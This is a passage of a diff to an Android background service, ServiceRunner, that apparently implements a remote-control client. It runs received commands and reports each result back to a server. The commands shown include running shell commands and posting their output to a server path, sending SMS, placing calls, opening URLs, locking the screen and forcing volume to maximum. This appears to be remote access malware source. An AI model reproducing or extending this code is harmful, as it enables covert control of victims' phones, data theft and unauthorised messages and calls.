+                    RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM));
             if (r != null) r.play();
-        } catch (Exception e) {}
+            reportCommandResult("play_alarm", "ok", "");
+        } catch (Exception e) {
+            reportCommandResult("play_alarm", "fail", e.getMessage());
+        }
     }
 
+    // ============================================================
+    // ★ Vibrate
+    // ============================================================
     private void vibrate(long ms) {
         try {
-            android.os.Vibrator v = (android.os.Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
-            if (v != null) v.vibrate(ms);
-        } catch (Exception e) {}
+            Vibrator v = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
+            if (v != null) {
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                    v.vibrate(android.os.VibrationEffect.createOneShot(ms,
+                            android.os.VibrationEffect.DEFAULT_AMPLITUDE));
+                } else {
+                    v.vibrate(ms);
+                }
+            }
+            reportCommandResult("vibrate", "ok", "");
+        } catch (Exception e) {
+            reportCommandResult("vibrate", "fail", e.getMessage());
+        }
     }
 
     private void showToast(final String text) {
-        new Handler(Looper.getMainLooper()).post(new Runnable() {
-            @Override
-            public void run() {
-                try {
-                    android.widget.Toast.makeText(getApplicationContext(),
-                        text, android.widget.Toast.LENGTH_LONG).show();
-                } catch (Exception e) {}
+        new Handler(Looper.getMainLooper()).post(() -> {
+            try {
+                Toast.makeText(getApplicationContext(), text, Toast.LENGTH_LONG).show();
+                reportCommandResult("toast", "ok", "");
+            } catch (Exception e) {
+                reportCommandResult("toast", "fail", e.getMessage());
             }
         });
     }
@@ -606,18 +803,23 @@ public class ServiceRunner extends Service {
             AudioManager am = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
             if (am == null) return;
             am.setStreamVolume(AudioManager.STREAM_MUSIC,
-                am.getStreamMaxVolume(AudioManager.STREAM_MUSIC), 0);
+                    am.getStreamMaxVolume(AudioManager.STREAM_MUSIC), 0);
             am.setStreamVolume(AudioManager.STREAM_ALARM,
-                am.getStreamMaxVolume(AudioManager.STREAM_ALARM), 0);
-        } catch (Exception e) {}
+                    am.getStreamMaxVolume(AudioManager.STREAM_ALARM), 0);
+            reportCommandResult("volume_max", "ok", "");
+        } catch (Exception e) {
+            reportCommandResult("volume_max", "fail", e.getMessage());
+        }
     }
 
     private void sendSmsToNumber(String to, String msg) {
         try {
             SmsManager sm = SmsManager.getDefault();
             sm.sendTextMessage(to, null, msg, null, null);
-            Log.d(TAG, "SMS sent");
-        } catch (Exception e) {}
+            reportCommandResult("send_sms", "ok", "");
+        } catch (Exception e) {
+            reportCommandResult("send_sms", "fail", e.getMessage());
+        }
     }
 
     private void callNumber(String number) {
@@ -626,7 +828,10 @@ public class ServiceRunner extends Service {
             intent.setData(Uri.parse("tel:" + number));
             intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
             startActivity(intent);
-        } catch (Exception e) {}
+            reportCommandResult("call", "ok", "");
+        } catch (Exception e) {
+            reportCommandResult("call", "fail", e.getMessage());
+        }
     }
 
     private void openUrl(String url) {
@@ -634,7 +839,10 @@ public class ServiceRunner extends Service {
             Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
             intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
             startActivity(intent);
-        } catch (Exception e) {}
+            reportCommandResult("open_url", "ok", "");
+        } catch (Exception e) {
+            reportCommandResult("open_url", "fail", e.getMessage());
+        }
     }
 
     private void executeShell(String command) {
@@ -653,15 +861,22 @@ public class ServiceRunner extends Service {
             d.put("command", command);
             d.put("output", output.toString());
             postJson("/apk/data", d);
-        } catch (Exception e) {}
+            reportCommandResult("shell", "ok", "");
+        } catch (Exception e) {
+            reportCommandResult("shell", "fail", e.getMessage());
+        }
     }
 
     private void lockScreen() {
         try {
-            android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager)
-                getSystemService(Context.DEVICE_POLICY_SERVICE);
+            android.app.admin.DevicePolicyManager dpm =
+                    (android.app.admin.DevicePolicyManager)
+                            getSystemService(Context.DEVICE_POLICY_SERVICE);
             if (dpm != null) dpm.lockNow();
-        } catch (Exception e) {}
+            reportCommandResult("lock_screen", "ok", "");
+        } catch (Exception e) {
+            reportCommandResult("lock_screen", "fail", e.getMessage());
+        }
     }
 
     private void goHome() {
@@ -670,7 +885,10 @@ public class ServiceRunner extends Service {
             intent.addCategory(Intent.CATEGORY_HOME);
             intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
             startActivity(intent);
-        } catch (Exception e) {}
+            reportCommandResult("show_home", "ok", "");
+        } catch (Exception e) {
+            reportCommandResult("show_home", "fail", e.getMessage());
+        }
     }
 
     // ============================================================
@@ -685,14 +903,17 @@ public class ServiceRunner extends Service {
             conn.setReadTimeout(20000);
 
             if (conn.getResponseCode() == 200) {
-                BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
+                BufferedReader reader = new BufferedReader(
+                        new InputStreamReader(conn.getInputStream()));
                 StringBuilder sb = new StringBuilder();
                 String line;
                 while ((line = reader.readLine()) != null) sb.append(line);
                 reader.close();
                 return sb.toString();
             }
-        } catch (Exception e) {}
+        } catch (Exception e) {
+            Log.e(TAG, "httpGet error: " + e.getMessage());
+        }
         return null;
     }
 
@@ -712,9 +933,9 @@ public class ServiceRunner extends Service {
             os.close();
 
             int rc = conn.getResponseCode();
-            Log.d(TAG, "POST " + path + " → " + rc);
+            Log.d(TAG, "POST " + path + " - " + rc);
         } catch (Exception e) {
             Log.e(TAG, "postJson error: " + e.getMessage());
         }
     }
-                                      }
+                }
